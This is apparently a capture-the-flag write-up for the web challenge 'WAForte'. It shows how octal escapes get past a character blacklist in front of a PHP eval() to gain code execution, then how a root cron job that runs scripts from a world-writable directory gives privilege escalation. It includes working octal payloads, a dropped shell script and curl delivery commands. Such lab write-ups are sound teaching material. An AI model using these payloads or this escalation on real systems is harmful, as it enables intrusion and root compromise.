<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=WAForte" alt="Typing SVG" /></a>

</div>

# WAForte — WEB · 🔴 HARD

- **Status:** ✅ SOLVED
- **Points:** 259 (final dynamic value)
- **Flag:** `IDP{p0p3n_3_rcE_3_cr0n_n3h_yHQd7ikF9y}`
- **Target:** `http://<HOST>:<PORT>` (Apache/2.4.69 Debian, PHP/8.3.36, ephemeral container, 15 min)
- **Prompt:** *"Dessa vez você não vai conseguir ler a flag."* ("This time you won't be able to read the flag.")

---

## TL;DR

1. Home prints `A flag está em /flag.txt` plus an HTML comment `<!-- ?source=1 -->`. `?source=1` dumps `index.php`.
2. `index.php` does **`eval($_GET['code'])`** after stripping — in a loop, until none remain — the characters `f l a g t x` (case-insensitive) and backtick `` ` ``.
3. **Octal string escapes `\nnn`** use only `\` and digits → they pass the filter and rebuild any string. This gives unrestricted PHP RCE as `www-data`.
4. But `/flag.txt` is `0400 root:root` — unreadable by `www-data`. Privesc: `cron` runs `/usr/local/bin/run-scripts` as **root every minute**, which `/bin/sh`-executes every `*.sh` in `/opt/scripts`, a **world-writable** (`1777`) directory.
5. Drop `/opt/scripts/pwn.sh` that copies the flag to a world-readable file; root runs it within 60s; read it back → flag.

## Analysis

### Recon — `/flag.txt` is not a URL

A sweep of path-normalization / encoding variants (`/%66lag.txt`, `//flag.txt`, `/flag.txt%00`, `/..%2fflag.txt`, …) all returned Apache's generic **404 (317 bytes)**, identical to any nonexistent path. Only `/flag.txt/..` returned 200 (45 bytes) — the index normalized to `/`. Conclusion: `/flag.txt` is a **filesystem** path, not a route. The "WAF" is in the app, not a reverse proxy.

```
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.3.36
Body: "A flag está em /flag.txt\n<!-- ?source=1 -->"
```

### The vulnerable source (`?source=1`)

```php
if (isset($_GET['source'])) { highlight_file(__FILE__); exit; }

if (isset($_GET['code'])) {
    $code = $_GET['code'];
    $blocked_characters = ['f', 'l', 'a', 'g', 't', 'x', '`'];
    while (true) {                       // loop until nothing left to strip
        $removed = false;
        foreach ($blocked_characters as $character) {
            $position = stripos($code, $character);   // case-INSENSITIVE
            if ($position === false) continue;
            echo "Hoje não, hacker!<br>";
            $code = substr_replace($code, '', $position, 1);
            $removed = true; break;
        }
        if (!$removed) break;
    }
    eval($code);                         // arbitrary PHP
}
echo "A flag está em /flag.txt";
```

The filter removes **every** occurrence of `f l a g t x` (either case) and `` ` ``, so doubling tricks (`ff`) don't survive. The final `eval`'d string contains none of those characters.

### Bypass — octal escapes

PHP double-quoted octal escapes `"\nnn"` are written with only `\` + digits, so no blocked character ever appears in the request. They decode to arbitrary bytes:

| char | octal | | char | octal |
|---|---|---|---|---|
| `/` | `\57` | | `t` | `\164` |
| `f` | `\146` | | `x` | `\170` |
| `l` | `\154` | | `.` | `\56` |
| `a` | `\141` | | `g` | `\147` |

`/flag.txt` → `"\57\146\154\141\147\56\164\170\164"`. For function names, `require` already has no blocked letter; for anything else (e.g. `system`, `readfile`) build the name via octal and call it as a **variable-function** `$f(...)`.

First working read used `require`:

```
?code=require"\57\146\154\141\147\56\164\170\164";
```

→ `Warning: require(/flag.txt): Failed to open stream: Permission denied` — RCE works, but the file is root-only `0400`.

### Privilege escalation — world-writable cron drop dir

RCE recon (`system` built from octal) revealed:

```
uid=33(www-data) ...                       # we are www-data
-r-------- 1 root root 39 /flag.txt         # 0400, root only; no sudo; only stock SUID
/etc/crontab:  * * * * * root /usr/local/bin/run-scripts
```

`/usr/local/bin/run-scripts`:

```sh
#!/bin/sh
set -eu
for script in /opt/scripts/*.sh; do
    [ -f "$script" ] || continue
    /bin/sh "$script"          # runs as ROOT, every minute
done
```

`/opt/scripts` is `drwxrwxrwt` (world-writable). Drop a script → root runs it.

```php
// ?code=  (system built from octal)
system("echo 'cat /flag.txt > /tmp/pwned.txt; chmod 666 /tmp/pwned.txt' > /opt/scripts/pwn.sh");
```

Wait one cron tick (`sleep 62` crosses the minute boundary), then:

```php
// ?code=  readfile("/tmp/pwned.txt")
$z="\162\145\141\144\146\151\154\145"; $z("\57\164\155\160\57\160\167\156\145\144\56\164\170\164");
```

```
IDP{p0p3n_3_rcE_3_cr0n_n3h_yHQd7ikF9y}
```

The flag name (`p0p3n` / `rcE` / `cr0n`) confirms the intended chain: filter-bypass RCE (`popen` is another blocked-char-free exec primitive) + root cron on a writable dir.

## What didn't work

| Hypothesis | Result | Why |
|---|---|---|
| Path/encoding bypass of a reverse-proxy WAF | ✗ | `/flag.txt` isn't a route; all variants = generic 404. The filter is in PHP, not a proxy |
| `require"/flag.txt"` directly | ✗ (but proved RCE) | file is `0400 root:root`, `www-data` can't read it |
| SUID binaries / `sudo` | ✗ | only stock SUID (chsh, mount, passwd, su, …); no `sudo` installed |

## Conclusion

The "strong WAF" is a character blacklist feeding `eval`; octal escapes defeat it entirely, yielding full RCE. The real gate is OS permissions — solved with a textbook writable-cron-dir privesc, since root re-runs `/opt/scripts/*.sh` every minute.

---

## Appendix — tools

- `solve.py` — `python3 solve.py` prints the 3-step chain (recon / drop / read) as ready `?code=` values; `python3 solve.py '<shell cmd>'` wraps any command as an octal `system()` payload. Has a self-check that asserts no blocked character remains.

Delivery (URL-encode the `code` value):

```bash
curl -s -G 'http://<HOST>:<PORT>/' --data-urlencode "code=$(python3 solve.py | sed -n '/2-drop/{n;p}')"
sleep 62
curl -s -G 'http://<HOST>:<PORT>/' --data-urlencode "code=$(python3 solve.py | sed -n '/3-read/{n;p}')"
```
